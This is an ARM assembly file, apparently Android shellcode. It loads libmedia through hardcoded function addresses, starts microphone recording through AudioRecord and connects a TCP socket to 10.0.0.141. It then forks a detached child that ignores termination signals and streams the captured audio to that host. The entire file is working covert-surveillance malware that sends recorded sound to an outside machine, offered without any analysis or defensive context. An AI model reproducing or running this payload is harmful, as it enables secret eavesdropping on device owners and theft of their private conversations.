.text
.align 4

.globl main

main:

#-----------------------------
    #add mprotect for test shellcode
    # ADR     R0, bin_load_addr
    # LDR     R0, [R0]
    # MOV     R1, #0x1000
    # MOV     R2, #0x07
    # ADR     R4, mprotect_func_addr
    # LDR     R4, [R4]
    # BLX     R4
#-----------------------------
    # dlopen/dlsym
    ADR     R0, libmedia
    MOV     R1, #0
    ADR     R4, dlopen_func_addr
    LDR     R4, [R4]
    BLX     R4
    STR     R0, libmedia_handle    

    ADR     R0, libmedia_handle
    LDR     R0, [R0]
    ADR     R1, construct
    ADR     R4, dlsym_func_addr
    LDR     R4, [R4]
    BLX     R4
    STR     R0, AudioRecord_constructor

    ADR     R0, libmedia_handle
    LDR     R0, [R0]
    ADR     R1, start
    ADR     R4, dlsym_func_addr
    LDR     R4, [R4]
    BLX     R4
    STR     R0, AudioRecord_start

    ADR     R0, libmedia_handle
    LDR     R0, [R0]
    ADR     R1, read
    ADR     R4, dlsym_func_addr
    LDR     R4, [R4]
    BLX     R4
    STR     R0, AudioRecord_read

#-----------------------------
    #AudioRecord_Constructor(fakeAudioRecordObject, 1, 16000, 0, 12, 0, 0, 0, 0, 0, 0, 0, 0);
    ADR     R0, fakeAudioRecordObject
    MOV     R1, #1

    ADR     R2, sample_rate
    LDR     R2, [R2]
    MOV     R3, #0
    MOV     R4, #12
    PUSH    {R3}
    PUSH    {R3}
    PUSH    {R3}
    PUSH    {R3}
    PUSH    {R3}
    PUSH    {R3}
    PUSH    {R3}
    PUSH    {R3}
    PUSH    {R4}
    ADR     R4, AudioRecord_constructor
    LDR     R4, [R4]
    BLX     R4

    # AudioRecord_start(fakeAudioRecordObject, 0, 0);
    ADR     R0, fakeAudioRecordObject
    MOV     R1, #0
    MOV     R2, #0
    ADR     R4, AudioRecord_start
    LDR     R4, [R4]
    BLX     R4
    
    # socket(2, 1, 0)
    MOV     R0, #2
    MOV     R1, #1
    SUB     R2, R2, R2
    LSL     R7, R1, #8
    ADD     R7, R7, #25
    SVC     1

    # total_size
    MOV     R10, #0
    # while max size
    MOV     R9, #0x50000

    # connect(r0, &addr, 16)
    # fd -> R8
    MOV     R8, R0
    ADR     R1, sockaddr
    MOV     R2, #16
    ADD     R7, #2
    SVC     1

# # while(1) 
# #     {
# #         printf("frame reading....\n");
# #         ret = AudioRecord_read(fakeAudioRecordObject, fakeRecordBuffer, BUFFER_SIZE);
# #         if (!ret) 
# #             break;
        
# #         total_size += ret;
        
# #         fwrite(fakeRecordBuffer, 1, ret, fp);
        
# #         if(total_size >= 0x50000)
# #             break;
# #     }
#-----------------------------
    # forck   
    MOV     R7, #2
    SVC     1

    CMP     R0, #0
    BLT     exit
    BNE     parent

register_sig:
    # signal(SIGILL, SIG_IGN)          
    MOV     R0, #4
    MOV     R1, #1
    ADR     R4, signal_func_addr
    LDR     R4, [R4]
    BLX     R4

    # signal(SIGSTOP, SIG_IGN)       
    MOV     R0, #19
    MOV     R1, #1
    ADR     R4, signal_func_addr
    LDR     R4, [R4]
    BLX     R4

    # signal(SIGTERM, SIG_IGN)       
    MOV     R0, #15
    MOV     R1, #1
    ADR     R4, signal_func_addr
    LDR     R4, [R4]
    BLX     R4

    # signal(SIGHUP, SIG_IGN)       
    MOV     R0, #1
    MOV     R1, #1
    ADR     R4, signal_func_addr
    LDR     R4, [R4]
    BLX     R4

    ADR     R4, setsid_func_addr
    LDR     R4, [R4]
    BLX     R4

while:

    ADR     R0, fakeAudioRecordObject
    ADR     R1, fakeRecordBuffer
    MOV     R2, #1024
    ADR     R4, AudioRecord_read
    LDR     R4, [R4]
    BLX     R4

    CMP     R0, #0
    BLE     while_break
    # total_size += ret;
    ADD     R10, R0

    # write(fd, fakeRecordBuffer, BUFFER_SIZE)
    MOV     R0, R8
    ADR     R1, fakeRecordBuffer
    MOV     R2, #1024
    MOV     R3, #0
    MOV     R4, #1
    LSL     R7, R4, #2
    ADD     R7, R7, #0
    SVC     1

    B       while

while_break:

    MOV     R0, R6
    MOV     R7, #6
    SVC     1

parent:
    # B       parent
    MOV     R0, #1
    ADR     R4, exit_func_addr
    LDR     R4, [R4]
    BLX     R4

exit:
    # MOV     R0, #0
    # MOVW    R7, #2
    # SVC     0
    MOV     R0, #0
    ADR     R4, exit_func_addr
    LDR     R4, [R4]
    BLX     R4

libmedia_handle:
    .word       0x11111111
AudioRecord_constructor:
    .word       0x22222222
AudioRecord_start:
    .word       0x33333333
AudioRecord_read:
    .word       0x44444444
sample_rate:
    .word       16000
libmedia:
    .ascii      "/system/lib/libmedia.so\0"
construct:
    .ascii      "_ZN7android11AudioRecordC1E14audio_source_tj14audio_format_tjjPFviPvS3_ES3_jiNS0_13transfer_typeE19audio_input_flags_tPK18audio_attributes_t\0\0\0\0"
start:
    .ascii      "_ZN7android11AudioRecord5startENS_11AudioSystem12sync_event_tEi\0"
read:
    .ascii      "_ZN7android11AudioRecord4readEPvj\0\0\0"
#0xf7759000
#-----------------------------
    # add mprotect for test shellcode
# mprotect_func_addr:
#     .word       0xF7796240
# bin_load_addr:
#     .word       0xAAAAA000
dlopen_func_addr:
    .word       0xF7767F08
dlsym_func_addr:
    .word       0xF7767EA8
signal_func_addr:
    .word       0xF7770D51
# [*] setsid : 0x0003c4e8
# [*] exit : 0x00011ac1
exit_func_addr:
    .word       0xF776AAC1
setsid_func_addr:
    .word       0xF77954E8

.align 2
sockaddr:  
    .short      0x2
    .short      0x0F27
    .byte       10,0,0,141

fakeAudioRecordObject:
    .skip 436 * 1
fakeRecordBuffer:
    .skip 1024 * 1

.end
